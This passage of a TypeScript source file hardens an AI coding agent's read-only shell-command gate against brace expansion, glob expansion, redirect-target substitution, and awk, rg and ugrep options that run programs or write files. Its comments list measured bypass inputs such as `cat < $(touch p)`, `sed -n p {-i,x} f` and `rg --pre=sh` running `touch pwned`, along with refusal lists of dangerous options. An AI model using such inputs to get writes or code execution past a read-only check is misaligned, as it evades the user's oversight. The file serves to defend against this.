}

// ============================================================
// UA12.82 follow-up — the argv inspectors read the words bash passes
// ============================================================

/**
 * The command line {@link validateBashCommand} is judging, for {@link shellArgv} to read word spans
 * from; `null` outside that call (the write-vector pass reads its own source).
 */
let inspectedSource: string | null = null;

/** Run `fn` with {@link inspectedSource} set to `source` (restored after, so a nested call cannot leak). */
function withInspectedSource<T>(source: string, fn: () => T): T {
  const outer = inspectedSource;
  inspectedSource = source;
  try {
    return fn();
  } finally {
    inspectedSource = outer;
  }
}

/**
 * The argv bash passes for `node` (its name, then its argument words; redirects left out, as
 * `validateCommand` builds `commandParts`), read from the source spans, or `null` when a word cannot be
 * read that way.
 *
 * NOT upstream (security deviation, owner rule (b), UA12.82 follow-up): bash-parser runs a JavaScript
 * unescape (unescape-js) over every quote-removed word, so the `text` the inspectors read is not what bash
 * passes: `'a\nb'` reads as `a<NL>b`, `'\\'` as one backslash, `'\x77'` as `w`, where bash keeps every
 * character inside single quotes. A differential fuzz of the sed walk against macOS `/usr/bin/sed`
 * (2026-10-02, at `f62062db7`) found 30 scripts that read as read-only and wrote a file, every one through
 * this: `sed -n ':a\ns|<NL>w o<NL>:b|x|' f` (BSD: the label `a\ns|`) and `sed -n '/\\/{w o<NL>}1; /p' f`
 * (sed: the address `/\\/`). And an unquoted brace expansion turns one word into several:
 * `sed -n p {-i,x} f` runs `sed -n p -i x f` (an in-place edit) and `sort {-o,x} f` runs `sort -o x f`,
 * while the inspectors saw one operand — both read as read-only on the shipped allowlist.
 */
function shellArgv(node: CommandNode): string[] | null {
  const source = inspectedSource;
  if (source === null) return null;
  const words = [node.name, ...(node.suffix ?? []).filter(item => item.type === 'Word')] as (WordNode | undefined)[];
  const argv: string[] = [];
  for (const word of words) {
    const loc = word?.loc;
    if (loc === undefined) return null;
    const text = shellWordText(source.slice(loc.start.char, loc.end.char + 1));
    if (text === null) return null;
    argv.push(text);
  }
  return argv;
}

/**
 * Bash's quote removal for one word's raw source: single quotes keep every character, double quotes let
 * `\` escape only `$ ` " \` and a newline, an unquoted `\` escapes the next character. `null` (the caller
 * refuses) for what this does not model or what the shell rewrites further: `$'…'`/`$"…"` quoting, any
 * other `$` or backtick (an expansion: already refused one layer up), an unterminated quote, and an
 * unquoted `{`…`}` pair (brace expansion, which can turn the word into several). Unquoted glob characters
 * stay as written: a name the glob matches could read as an option, so the gate refuses such a word before
 * the inspectors run (UA12.212, {@link unquotedGlobReason}).
 */
function shellWordText(raw: string): string | null {
  let out = '';
  let braces = '';
  for (let i = 0; i < raw.length; i++) {
    const ch = raw[i]!;
    if (ch === "'") {
      const end = raw.indexOf("'", i + 1);
      if (end < 0) return null;
      out += raw.slice(i + 1, end);
      i = end;
    } else if (ch === '"') {
      let j = i + 1;
      for (; j < raw.length && raw[j] !== '"'; j++) {
        const c = raw[j]!;
        if (c === '\\' && j + 1 < raw.length && '$`"\\\n'.includes(raw[j + 1]!)) {
          if (raw[j + 1] !== '\n') out += raw[j + 1];
          j++;
        } else if (c === '$' || c === '`') {
          return null;
        } else {
          out += c;
        }
      }
      if (j >= raw.length) return null;
      i = j;
    } else if (ch === '\\') {
      if (i + 1 >= raw.length) return null;
      if (raw[i + 1] !== '\n') out += raw[i + 1];
      i++;
    } else if (ch === '$' || ch === '`') {
      return null;
    } else {
      if (ch === '{' || ch === '}') braces += ch;
      out += ch;
    }
  }
  return braces.includes('{') && braces.includes('}') ? null : out;
}

/** An unquoted `{…}` holding an unquoted `,` or `..`: the shape bash brace-expands (`{}` alone it leaves). */
const BRACE_EXPANSION = /\{[^{}]*(?:,|\.\.)[^{}]*\}/;

/**
 * A rejection when `word` carries a brace expansion, read from its source span (bash-parser keeps the
 * braces as text and lists no expansion for them).
 *
 * NOT upstream (security deviation, owner rule (b), UA12.82 follow-up): bash turns one such word into
 * several BEFORE the program runs, so the gate judged an argv the program never sees. Measured
 * 2026-10-02 at `0dcf20c12` on the shipped allowlist: `find . -name x {-delete,}` (runs
 * `find . -name x -delete`), `git log {--output=o,-1}`, `git diff {--output=o,HEAD}`, `tree {-o,o}` and
 * `awk {-f,x} f` read as read-only. Upstream v0.14.0 has the same gap. A quoted or escaped brace or comma
 * is literal to bash and stays allowed; without a recorded span the unquoted text is judged (fails closed).
 * Decided over-block: a harmless `ls src/{a,b}` is refused too (an expansion also defeats the operand
 * budgets, {@link operandsWithinLimit}); the explanation asks for the arguments written out.
 */
function braceExpansionReason(word: WordNode): BashValidationReason | null {
  const loc = word.loc;
  const raw = inspectedSource !== null && loc !== undefined ? inspectedSource.slice(loc.start.char, loc.end.char + 1) : word.text;
  if (!BRACE_EXPANSION.test(unquotedShape(raw))) return null;
  return {
    type: 'unsafe_command',
    command: word.text,
    explanation: `Brace expansion {a,b} turns one word into several arguments the check does not see; write each argument out (found in: ${word.text})`,
  };
}

/** `raw` with every quoted or backslash-escaped character replaced by `_` (an unterminated quote: `raw` as is). */
function unquotedShape(raw: string): string {
  let out = '';
  for (let i = 0; i < raw.length; i++) {
    const ch = raw[i]!;
    if (ch === '\\') {
      out += '__';
      i++;
    } else if (ch === "'" || ch === '"') {
      let j = i + 1;
      while (j < raw.length && raw[j] !== ch) j += ch === '"' && raw[j] === '\\' ? 2 : 1;
      if (j >= raw.length) return raw;
      out += '_'.repeat(j - i + 1);
      i = j;
    } else {
      out += ch;
    }
  }
  return out;
}

/**
 * A rejection when a redirect's TARGET word carries an expansion ({@link checkWordForExpansions}) or a brace
 * expansion ({@link braceExpansionReason}); `validateCommand` reads it before {@link isRedirectSafe}.
 *
 * NOT upstream (security deviation, owner rule (b), UA12.83 follow-up 2): the gate checked the name and the
 * argument words only, and `isRedirectSafe` passes any `<` before it reads the target, yet bash expands the
 * target (running every `cmd`, $(cmd) and $(( `cmd` )) in it) before it opens the file. Measured 2026-10-02 at
 * `1e0d46d07` on the shipped allowlist: `cat < $(touch p)`, `cat < $(( `touch p` ))`,
 * `cat < "$(( `touch p` ))"` and ``cat < `touch p` `` read as read-only, and /bin/bash 3.2.57 created the file
 * although the redirect then failed. Upstream v0.14.0 `isRedirectSafe` has the same gap. A literal target
 * (`cat < file.txt`, `2>/dev/null`, `2>&1`) is unaffected.
 */
function redirectTargetExpansionReason(redirect: RedirectNode): BashValidationReason | null {
  return redirect.file ? (checkWordForExpansions(redirect.file) ?? braceExpansionReason(redirect.file)) : null;
}

/**
 * bash-parser hangs a COMPOUND command's redirects on the Subshell / CompoundList node itself (`redirections`),
 * not on an inner Command: `(cat) < $(touch p)`, `{ ls; } > out.txt`.
 */
function compoundRedirects(node: SubshellNode | CompoundListNode): RedirectNode[] {
  return (node as { redirections?: RedirectNode[] }).redirections ?? [];
}

/**
 * The read-only gate's rule for a compound command's redirects — the rule `validateCommand`'s two redirect
 * branches apply inline (an expanding target via {@link redirectTargetExpansionReason}, then any redirect
 * {@link isRedirectSafe} does not pass), read by `validateSubshell` / `validateCompoundList` before (or after) they
 * walk the inner list.
 *
 * NOT upstream (security deviation, owner rule (b), UA12.83 follow-up 3): follow-up 2 held only a SIMPLE command's
 * redirect targets, and both compound validators walked the inner list without reading `redirections`, so
 * `(cat) < $(touch p)`, `{ cat; } < $(touch p)`, `(ls) > out.txt` and `ls | (cat) > out.txt` read as read-only on
 * the shipped allowlist; /bin/bash 3.2.57 ran the embedded command and wrote the file (measured 2026-10-02 by the
 * UA-cr10 verifier). Upstream v0.14.0 `validateSubshell` is the same one-liner. A literal input redirect,
 * `2>/dev/null` and `2>&1` on a compound stay read-only, as on a simple command.
 */
function compoundRedirectRejection(node: SubshellNode | CompoundListNode): BashValidationResult | null {
  for (const redirect of compoundRedirects(node)) {
    const reason: BashValidationReason | null = redirectTargetExpansionReason(redirect) ?? (isRedirectSafe(redirect)
      ? null
      : { type: 'redirect', op: redirect.op.text, explanation: getRedirectExplanation(redirect.op.text) });
    if (reason) return { allowed: false, reason };
  }
  return null;
}

/**
 * The isolation write scanner's half of UA12.83 follow-up 3: `collectWriteVectors` recursed into a compound's
 * inner list and never read its `redirections`, so `(ls) > /elsewhere/x` reported no write. A target carrying a
 * command, process or arithmetic substitution fails closed to the cwd (it runs before the open, and `expandPath`
 * cannot evaluate it) — checked BEFORE {@link isRedirectSafe}, which passes any `<`; otherwise the same handling as
 * `collectCommandWriteVectors`' `handleRedirect`: a safe redirect writes nothing, a literal target is a path vector.
 */
function collectCompoundRedirectVectors(node: SubshellNode | CompoundListNode, out: BashWriteVector[]): void {
  for (const redirect of compoundRedirects(node)) {
    const expansions = redirect.file?.expansion ?? [];
    if (expansions.some(exp => exp.type === 'CommandExpansion' || exp.type === 'ProcessSubstitution' || exp.type === 'ArithmeticExpansion')) {
      out.push({ kind: 'cwd' });
      continue;
    }
    if (isRedirectSafe(redirect)) continue;
    const target = redirect.file?.text ?? '';
    out.push(target.trim() ? { kind: 'path', target } : { kind: 'cwd' });
  }
}

/**
 * UA12.88 follow-up 2 — the program-level verdict `validateCommand` gives on the bash path (the awk
 * inspector, {@link DANGEROUS_COMMAND_ARGS}, then {@link argvInspectorReason}: sed, sort, gh api, rg) for a
 * native command another parser already split into words — the PowerShell AST walk
 * (`powershell-validator.ts` `validateCommand`), which had matched the regexes alone. A reason when the
 * invocation writes, runs a program or changes remote state; `null` otherwise. The name is lower-cased
 * as the bash gate lower-cases it; there is no bash node, so the words are read as given.
 */
export function nativeArgvInspectorReason(argv: string[]): string | null {
  const name = programNameKey(argv[0] ?? '');
  if (AWK_COMMANDS.has(name)) return getDangerousAwkReason(argv);
  const dangerous = DANGEROUS_COMMAND_ARGS[name] ? argv.find(part => DANGEROUS_COMMAND_ARGS[name]!.has(part)) : undefined;
  if (dangerous) return `"${dangerous}" allows arbitrary command execution or file modification within "${name}"`;
  return hasArgvInspector(name) ? argvInspectorReason(name, argv) : null;
}

/**
 * UA12.183 `[security]` `[CRITICAL]` — where awk takes its PROGRAM, and gawk loads CODE or writes a
 * file, through an OPTION or a directive, which {@link getDangerousAwkReason}'s text patterns never
 * read: a program file (`-f`/`--file`, gawk `-E`/`--exec`, `-W exec`, so `awk -f -` runs whatever
 * stdin carries), an included source (`-i`/`--include`; `-i inplace` rewrites the input files), a
 * shared library (`-l`/`--load`), gawk's debug writers (`-d`/`--dump-variables`,
 * `-o`/`--pretty-print`, `-p`/`--profile`, `-D`/`--debug`, `--persist`), and in the program text
 * `@include` / `@load` / `@namespace` and the indirect call `@f()`. Measured on macOS /usr/bin/awk
 * (BWK 20200816, 2026-10-09): `awk -f p.awk` and `awk -fp.awk` run p.awk. `-e`/`--source` stay —
 * their program text is on the line, where the text patterns read it.
 *
 * Every rule falls to the refusing side, because the gate does not know WHICH awk will run: a
 * short-option cluster is walked letter by letter (gawk/busybox read `-bf p` as `-b -f p`, and
 * BWK's `-safe` is gawk's `-s -a -f e`); the walk stops only at `-F`/`-v`/`-e`, whose argument every
 * awk takes; a long option or a `-W` name is refused when it ABBREVIATES a refused name (getopt_long
 * accepts `--fil`, mawk `-We`); every word is read, not only those before the program (an operand
 * named `-f…` is an over-block, never a bypass), up to a `--` whose previous word is not an option
 * (after an option, `--` may be its separate argument: every awk reads `-F --` as FS = `--`, so
 * `awk -F -- -f p.awk` still runs p.awk — UA12.183 follow-up). Stated over-blocks: `-F -f` (a
 * separator spelled `-f`), a refused-looking operand after an option's `--` (`awk -s -- '…' -f`),
 * and an `@` followed by a letter anywhere on the line, e.g. `/user@host/`.
 * Not upstream (v0.14.0 reads only the program text); owner rule (b), security.
 */
const AWK_REFUSED_SHORT_OPTIONS = new Set(['f', 'E', 'i', 'l', 'd', 'D', 'o', 'p']);
const AWK_ARGUMENT_SHORT_OPTIONS = new Set(['F', 'v', 'e']);
const AWK_REFUSED_LONG_OPTIONS = [
  'file', 'exec', 'include', 'load', 'dump-variables', 'pretty-print', 'profile', 'debug', 'persist',
];

/** Whether a long-option name (`--NAME[=…]`, or a `-W` name list) abbreviates a refused one. */
function awkLongOptionIsRefused(text: string): boolean {
  return text.split(',').some(item => {
    const name = (item.trim().split('=')[0] ?? '').toLowerCase();
    return name.length > 0 && AWK_REFUSED_LONG_OPTIONS.some(option => option.startsWith(name));
  });
}

function getDangerousAwkOptionReason(commandParts: string[]): string | null {
  const optionReason = 'awk program-file, include, load and debug-output options run code from a file or write one';
  for (let index = 1; index < commandParts.length; index++) {
    const word = commandParts[index] ?? '';
    // `--` ends the options only in option position: after a word that is itself an option it may be
    // that option's separate argument (`awk -F -- -f p.awk` runs p.awk; `mawk -W --`, `--field-separator --`).
    const previous = commandParts[index - 1] ?? '';
    if (word === '--' && !(previous.startsWith('-') && previous !== '-')) break;
    if (!word.startsWith('-') || word === '-') continue;
    if (word.startsWith('--')) {
      if (awkLongOptionIsRefused(word.slice(2))) return optionReason;
      continue;
    }
    for (let at = 1; at < word.length; at++) {
      const letter = word[at] as string;
      if (AWK_REFUSED_SHORT_OPTIONS.has(letter)) return optionReason;
      if (letter === 'W') {
        if (awkLongOptionIsRefused(word.slice(at + 1) || (commandParts[index + 1] ?? ''))) return optionReason;
        break;
      }
      if (AWK_ARGUMENT_SHORT_OPTIONS.has(letter)) break;
    }
  }
  // `\`+newline separates tokens (UA12.103), so `@\<NL>include` is `@ include`; `\s*` reads it.
  if (/@\s*[A-Za-z_]/.test(commandParts.slice(1).join(' ').replace(/\\\r?\n/g, ' '))) {
    return 'awk @include / @load / @namespace directives and indirect @function calls load or run code';
  }
  return null;
}

/**
 * UA12.207 `[security]` — bash expands an unquoted glob BEFORE awk starts, so the words {@link
 * getDangerousAwkOptionReason} and the text patterns read are not the argv awk receives: with a file named
 * `-f` and a program file `p.awk` in the cwd, `awk *` and `awk -? p.awk` run `awk -f p.awk` (measured
 * 2026-10-09, macOS /usr/bin/awk BWK 20200816 under /bin/bash 3.2.57), and a glob in the program position
 * hands awk a file NAME as its program text. Fail-closed and simplest (the row's fix): an unquoted glob or
 * bracket character ({@link UNRESOLVABLE_OPERAND_METACHAR}, the sed script rule's instrument) in any awk
 * argument refuses the line; `isLiteral(index)` says whether the word's SOURCE span proves its
 * metacharacters literal ({@link wordMetacharactersAreLiteral}), so `'/a*b/'` stays read-only. Stated
 * over-block: `awk '{print $1}' *.log` (and `-F[,]`) is refused; `cat *.log | awk '{print $1}'` reads the
 * same. The PowerShell route needs no copy: since UA12.208 the bash gate judges that line too.
 *
 * UA12.212 `[security]` `[CRITICAL]` — the same rule for every head with an argv inspector ({@link
 * hasArgvInspector}: sed, sort, gh), whose {@link shellArgv} keeps an unquoted glob as written: with files
 * named `-o`, `out` and `src.txt` in the cwd, `sort *` runs `sort -o out src.txt`, and with `-o.txt` beside
 * `a.txt`, `sort *.txt` writes `.txt` (measured 2026-10-09, macOS sort 2.3-Apple under /bin/bash 3.2.57);
 * GNU sed permutes its options, so a file named `-i.log` turns `sed -n '1,5p' *.log` into an in-place edit
 * (Git Bash's and Linux's sed; documented getopt behaviour, not measured here — macOS sed stops at the
 * script); `gh api *` can expand to `-XPOST` or `-f…`. DECIDED (simplest, safe): every unquoted glob
 * refuses, `sed -n '1,5p' *.log` and the prefixed `sort ./*.txt` included (stated over-block; quote it, or
 * `cat *.log | sed -n '1,5p'`, which reads the same stream). `name` is the lower-cased head.
 *
 * UA12.212 follow-up `[security]` `[CRITICAL]` — the cause is not the inspectors: the shipped allowlist keeps
 * writing spellings out with lookaheads on the command TEXT, which an unquoted glob passes. Measured
 * 2026-10-09 under /bin/bash in temp dirs: `git diff *` beside a file named `--output=pwned` wrote `pwned`;
 * `uniq *` with files `a` and `b` overwrote `b`; `xmllint *` beside `-o` and `out` wrote `out` (all three
 * allowed by the gate, `git diff *` and `xmllint *` proven reads by the write-scan). DECIDED (simplest,
 * safe): the rule now covers EVERY head except {@link globSafeHead}'s audited readers. Stated over-blocks:
 * an unquoted glob after `git`, `rg`, `find`, `jq`, `file`, `tree`, `less` and every other head, a custom
 * operator pattern's head included (quote the glob, or use a glob-safe reader: `cat *.json | jq .`).
 *
 * UA12.212 follow-up 2 — a word is flagged for an unquoted pathname-expansion character ({@link GLOB_METACHAR})
 * or a real brace expansion ({@link BRACE_EXPANSION}: a `{…}` holding `,` or `..`), not for any brace: bash
 * leaves a lone `{u}` literal, and the follow-up's wider set refused git's revision syntax (`@{upstream}`,
 * `@{u}`, `stash@{0}`, `HEAD@{2}`) — the shipped code-review skill's `git diff @{upstream}...HEAD` among them —
 * with an explanation claiming an expansion that never happens. `isLiteral` still judges every metacharacter
 * of {@link UNRESOLVABLE_OPERAND_METACHAR}, so a word mixing a quoted glob and an unquoted brace pair fails
 * closed (stated over-block).
 */
function unquotedGlobReason(name: string, words: readonly string[], isLiteral: (index: number) => boolean): string | null {
  if (globSafeHead(name)) return null;
  for (let index = 1; index < words.length; index++) {
    const word = words[index] ?? '';
    if ((GLOB_METACHAR.test(word) || BRACE_EXPANSION.test(word)) && !isLiteral(index)) {
      if (!AWK_COMMANDS.has(name) && !hasArgvInspector(name)) return `${name}: an unquoted glob (${words[index]}) is expanded by the shell before ${name} reads it, so a file name can become an option that writes a file or runs a command; quote it, or list the files with a reader that has no such option (ls, cat, grep, head, …)`;
      if (AWK_COMMANDS.has(name)) return `awk: an unquoted glob (${words[index]}) is expanded by the shell before awk reads it, so a file name can become an option (-f runs a program file) or the program; quote it, or pipe the files in (cat *.log | awk ...)`;
      const effect = name === 'gh' ? '-X, -f or -F make the request a write' : name.endsWith('sort') ? '-o writes a file' : name === 'rg' ? '--pre or --hostname-bin runs a program' : '-i edits the files in place';
      return `${name}: an unquoted glob (${words[index]}) is expanded by the shell before ${name} reads it, so a file name can become an option (${effect}); quote it${name === 'gh' ? '' : `, or pipe the files in (cat *.log | ${name} ...)`}`;
    }
  }
  return null;
}

/**
 * Whether argument `index` of `node` (its suffix words, as `validateCommand` builds `commandParts`) has a
 * recorded source span proving its metacharacters literal; `false` without a span (fails closed).
 */
function wordIsShellLiteral(node: CommandNode, index: number): boolean {
  const word = (node.suffix ?? []).filter(item => item.type === 'Word')[index - 1] as WordNode | undefined;
  const loc = word?.loc;
  if (inspectedSource === null || loc === undefined) return false;
  return wordMetacharactersAreLiteral(inspectedSource.slice(loc.start.char, loc.end.char + 1));
}

/**
 * UA12.212 follow-up — the heads an unquoted glob may follow: audited 2026-10-09 to have no option that
 * writes a file or runs a command in GNU or BSD form, so a file name the glob turns into an option can at
 * most change what they print. Adding a head here is a security decision: audit every option it takes.
 * `name` is the lower-cased head.
 */
function globSafeHead(name: string): boolean {
  return GLOB_SAFE_HEADS.has(name);
}

const GLOB_SAFE_HEADS: ReadonlySet<string> = new Set(['ls', 'cat', 'head', 'tail', 'wc', 'grep', 'du', 'stat', 'nl', 'cut', 'echo']);

/** The characters bash pathname-expands ({@link unquotedGlobReason}); a brace is flagged only as {@link BRACE_EXPANSION}. */
const GLOB_METACHAR = /[*?[]/;

/**
 * UA12.215 `[security]` `[CRITICAL]` — the ripgrep options that RUN A PROGRAM, which the shipped `^rg\b`
 * read-only pattern let through. Audited 2026-10-09 against ripgrep 14.1.1's own option list (`rg --help`,
 * 104 options): `--pre=COMMAND` runs COMMAND once per searched file with the file's path ("ripgrep will
 * unconditionally spawn a process for every file that is searched"), and `--hostname-bin=COMMAND` runs
 * COMMAND with no arguments to learn the host name for hyperlinks. Measured under /bin/bash in temp dirs:
 * `rg --pre=sh foo a.txt` with a.txt = `touch pwned` created `pwned` (Plan / Don't ask ran it), and
 * `rg --hostname-bin=./hb.sh foo a.txt` ran hb.sh with no `--hyperlink-format` on the line. rg refuses an
 * abbreviated long flag (`--pr=sh`, `--hostname=x`: "unrecognized flag"), and neither option has a short
 * form, so the exact word and its `=` prefix are every spelling. ripgrep writes no file of its own.
 *
 * DECIDED (simplest, safe; owner question in QUESTIONS.md): refuse both in either spelling, wherever the
 * word sits (also as the value of `-e` or after `--`: a stated over-block, since `rg -e -- --pre=sh` makes
 * the second word a flag again). `--pre-glob` stays read-only — it only narrows which files `--pre` runs on
 * and ran nothing alone (measured). `-z`/`--search-zip` stays read-only: it runs fixed decompressors
 * (gzip, xz, …) found on PATH, not one the line names. A config file (`RIPGREP_CONFIG_PATH`) can carry
 * `--pre` too, but an env assignment on the line is already refused by the gate; the user's own
 * environment is theirs. `argv` is the argv bash passes ({@link shellArgv}), so `"--pre=sh"` and
 * `--pr\e=sh` read as `--pre=sh`.
 */
function getDangerousRgReason(argv: readonly string[]): string | null {
  for (const word of argv.slice(1)) {
    const option = RG_PROGRAM_OPTIONS.find(name => word === name || word.startsWith(`${name}=`));
    if (option) return `rg: ${option} runs a program (${option === '--pre' ? 'once per searched file' : 'to learn the host name'}), so the search is not read-only`;
  }
  return null;
}

/** ripgrep's options that run a program ({@link getDangerousRgReason}). */
const RG_PROGRAM_OPTIONS: readonly string[] = ['--pre', '--hostname-bin'];

/**
 * UA12.215 follow-up `[security]` — the key the program-level lookups (the awk inspector,
 * {@link DANGEROUS_COMMAND_ARGS}, {@link argvInspectorReason}, {@link globSafeHead}) read a head name by:
 * lower-cased, and with a trailing `.exe` dropped. The shipped read-only patterns (`^rg\b`, `^find\b`,
 * `^awk\b`) admit `rg.exe` because `\b` falls between `g` and `.`, and on win32 Git Bash and PowerShell
 * run the same program for it, so keying on the exact word let `rg.exe --pre=sh` and `find.exe -delete`
 * read as read-only. The `.exe` half is the rule `commandHeadName` (`core/dangerous-commands.ts`) applies
 * to the dangerous-command floor; its path-segment half is NOT taken here, because the read-only patterns
 * never admit a path-spelled head and a basename would only widen {@link globSafeHead}.
 */
function programNameKey(name: string): string {
  const lower = name.toLowerCase();
  return lower.endsWith('.exe') ? lower.slice(0, -4) : lower;
}

/**
 * UA12.216 `[security]` — the "grep" options that are NOT reads where the head resolves to ugrep: a
 * user's alias, or a shell snapshot such as Claude Code's ant-native one. ugrep runs a program through
 * `--filter=EXT:CMD` (each searched file is piped through CMD) and writes a file through
 * `--save-config[=FILE]`. Measured 2026-10-09 on ugrep 7.8.4 (the copy the ZCode app bundles at
 * Resources/tools/ugrep): `--filter=txt:sh foo a.txt` with a.txt = `touch pwned` created `pwned`, and
 * `--save-config foo b.txt` wrote `.ugrep`. The shipped `^grep\b` read-only pattern admits any argv, so
 * both read as reads today; the system grep on the measuring host (BSD grep 2.6.0-FreeBSD) has NEITHER
 * option, so refusing them on a grep head over-blocks nothing real — it guards only the resolution.
 *
 * DECIDED (the rg posture, UA12.215; the cheap safe fix the row prescribes): the word refuses wherever
 * it sits, also as `-e`'s value or after `--` (a stated over-block: `grep -e --filter foo` searches for
 * a pattern literally named `--filter`). ugrep refuses abbreviated long flags as rg does (`--filt=txt:sh`,
 * `--save=x`: exit 2, nothing ran — measured), so the exact word and its `=` prefix are every spelling,
 * and the neighbouring `--filter-magic-label=[+]LABEL:MAGIC` (a label, not a command; measured running
 * nothing) is left alone by the `word === option || word.startsWith(option + '=')` shape. `ugrep` and
 * `ug` heads have no shipped allowlist entry today, so the gate refuses them at the patterns already;
 * the inspector keeps them refused behind any custom list that admits them and covers the PowerShell
 * route. grep stays in {@link GLOB_SAFE_HEADS}: an unquoted glob after a read head is untouched.
 * `argv` is the argv bash passes ({@link shellArgv}), so `"--filter=txt:sh"` reads as `--filter=txt:sh`.
 */
function getDangerousGrepReason(name: string, argv: readonly string[]): string | null {
  for (const word of argv.slice(1)) {
    const option = GREP_WRITE_OR_PROGRAM_OPTIONS.find(option => word === option || word.startsWith(`${option}=`));
    if (!option) continue;
    const why = option === '--filter' ? 'pipes each searched file through a command' : 'writes a config file';
    const resolves = name === 'grep' ? ' (a "grep" here may resolve to ugrep, which has this option)' : '';
    return `${name}: ${option} ${why}${resolves}, so the search is not read-only`;
  }
  return null;
}

/** The grep-family options that run a program or write a file where the head is ugrep ({@link getDangerousGrepReason}). */
const GREP_WRITE_OR_PROGRAM_OPTIONS: readonly string[] = ['--filter', '--save-config'];
